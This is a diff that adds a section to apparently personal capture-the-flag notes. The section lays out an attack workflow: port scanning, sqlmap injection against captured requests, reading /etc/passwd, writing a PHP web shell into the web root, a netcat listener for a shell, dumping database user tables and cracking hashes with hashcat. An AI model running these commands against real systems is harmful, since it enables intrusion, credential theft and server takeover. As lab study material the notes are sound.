@@ -59,7 +59,33 @@ scan with nmap only the open ports since nmap gives a more detailed scan
 3. nmap -Pn -sU -top-ports 1000 <IP>
 last do a scan for udp ports just in case
 
+-----------------------------------------------------------------------------------------------------------------
+A good practise
 
+1.nmap or rustscan like above
+2. if you can create a user do it
+3. in when ever field yyou can commit something like username or after some url or image or dont know, use burp for it
+and then copy the request in a sql.txt and use:
+
+   sqlmap -r sql.txt --batch
+try all the possible fields and forms
+4.good idea is: sqlmap -r sql.txt -p url --batch --sql-query="SELECT LOAD_FILE('/etc/passwd')"
+
+or just upload a file with sqli:
+ sqlmap -r sql.txt -p url --file-write-/home/kali/chal/shell.php --file-dest=/var/www/vote/shellz.php --batch
+and open your nc -lvnp <port>
+
+then jus go at /var/www/html and find some confs or dbs
+in www-data shell do:
+mysql -u <usernameyufound> -p <tablenameyoufound>
+and then put the password
+then
+SHOW DATABASES;
+USE name;
+SHOW TABLES;
+SELECT * FROM users LIMIT 10;
+and crack some hashes with:
+hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 Some recon things :)
 
